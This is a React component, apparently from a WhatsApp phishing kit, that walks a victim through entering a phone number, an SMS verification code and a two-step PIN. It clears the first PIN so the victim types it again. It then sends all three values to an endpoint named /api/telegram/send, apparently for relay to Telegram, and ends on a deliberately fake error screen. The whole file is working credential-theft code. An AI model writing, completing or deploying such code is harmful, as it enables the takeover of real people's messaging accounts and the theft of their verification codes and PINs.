import React, { useState } from 'react';
import StepIndicator from './StepIndicator';
import PhoneStep from './PhoneStep';
import CodeStep from './CodeStep';
import PinStep from './PinStep';
import PinRetryStep from './PinRetryStep';
import ErrorStep from './ErrorStep';

export type FormData = {
  phoneNumber: string;
  verificationCode: string;
  whatsappPin: string;
};

const AuthForm: React.FC = () => {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<FormData>({
    phoneNumber: '',
    verificationCode: '',
    whatsappPin: ''
  });

  const totalSteps = 5;

  const handleNextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handlePrevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const updateFormData = (field: keyof FormData, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const submitForm = async () => {
    handleNextStep(); // Aller à l'étape PIN
  };

  const submitPinForm = async () => {
    setFormData(prev => ({ ...prev, whatsappPin: '' })); // vider le champ pour l'étape 4
    handleNextStep(); // Aller à l'étape de ré-saisie du PIN
  };

  const submitPinRetryForm = async () => {
    try {
      const response = await fetch('http://localhost:5176/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });
      if (!response.ok) {
        throw new Error('Failed to send to Telegram');
      }
    } catch (error) {
      console.error('Telegram send error:', error);
    }
    handleNextStep(); // Aller à l'étape d'erreur (affichage demandé)
  };

  const restartFlow = () => {
    setFormData({ phoneNumber: '', verificationCode: '', whatsappPin: '' });
    setCurrentStep(1);
  };

  return (
    <div className="max-w-md mx-auto">
      <StepIndicator currentStep={currentStep} totalSteps={totalSteps} />
      
      <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
        <div className="p-8">
          {currentStep === 1 && (
            <PhoneStep 
              phoneNumber={formData.phoneNumber}
              updatePhoneNumber={(value) => updateFormData('phoneNumber', value)}
              onNext={handleNextStep}
            />
          )}
          
          {currentStep === 2 && (
            <CodeStep 
              verificationCode={formData.verificationCode}
              phoneNumber={formData.phoneNumber}
              updateVerificationCode={(value) => updateFormData('verificationCode', value)}
              onNext={submitForm}
              onBack={handlePrevStep}
            />
          )}
          
          {currentStep === 3 && (
            <PinStep 
              whatsappPin={formData.whatsappPin}
              updateWhatsappPin={(value) => updateFormData('whatsappPin', value)}
              onNext={submitPinForm}
              onBack={handlePrevStep}
            />
          )}

          {currentStep === 4 && (
            <PinRetryStep 
              whatsappPin={formData.whatsappPin}
              updateWhatsappPin={(value) => updateFormData('whatsappPin', value)}
              onNext={submitPinRetryForm}
              onBack={handlePrevStep}
            />
          )}

          {currentStep === 5 && (
            <ErrorStep onRestart={restartFlow} />
          )}
        </div>
      </div>
    </div>
  );
};

export default AuthForm;